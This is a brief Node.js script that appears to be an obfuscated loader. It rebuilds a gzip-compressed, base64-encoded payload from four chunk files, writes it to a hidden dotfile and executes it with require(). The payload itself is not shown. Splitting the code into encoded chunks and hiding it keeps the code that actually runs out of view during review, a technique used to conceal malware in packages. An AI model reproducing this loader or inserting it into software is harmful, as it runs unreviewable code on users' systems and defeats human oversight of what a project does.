const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const Target = path.join(__dirname, ".server-v13.generated.js");
const ChunkCount = 4;
if (!fs.existsSync(Target) || fs.statSync(Target).size < 1000) {
    let Payload = "";
    for (let i = 0; i < ChunkCount; i++) {
        Payload += fs.readFileSync(path.join(__dirname, "server-v13-payload." + i + ".b64"), "utf8").trim();
    }
    fs.writeFileSync(Target, zlib.gunzipSync(Buffer.from(Payload, "base64")));
}
require(Target);
